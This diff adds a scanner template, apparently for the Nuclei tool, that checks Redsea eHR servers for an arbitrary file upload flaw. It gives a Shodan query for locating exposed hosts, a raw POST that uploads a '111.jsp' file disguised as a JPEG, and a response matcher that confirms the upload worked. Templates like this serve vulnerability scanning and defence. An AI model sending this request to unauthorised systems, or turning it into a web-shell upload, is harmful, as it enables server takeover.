@@ -1,0 +1,37 @@
+id: hr_soft_eHR_PtFjk_mob_Fileupload
+
+info:
+  name: hr_soft_eHR_PtFjk_mob_Fileupload
+  author: HK
+  severity: high
+  description: hr_soft_eHR_PtFjk_mob_Fileupload
+  metadata:
+    max-request: 1
+    shodan-query: body="/RedseaPlatform/skins/images/favicon.ico"
+    verified: true
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
+    Content-Length: 186
+
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4
+    Content-Disposition: form-data; name="fj_file"; filename="111.jsp"
+    Content-Type:image/jpeg
+
+    123
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - herfUrl
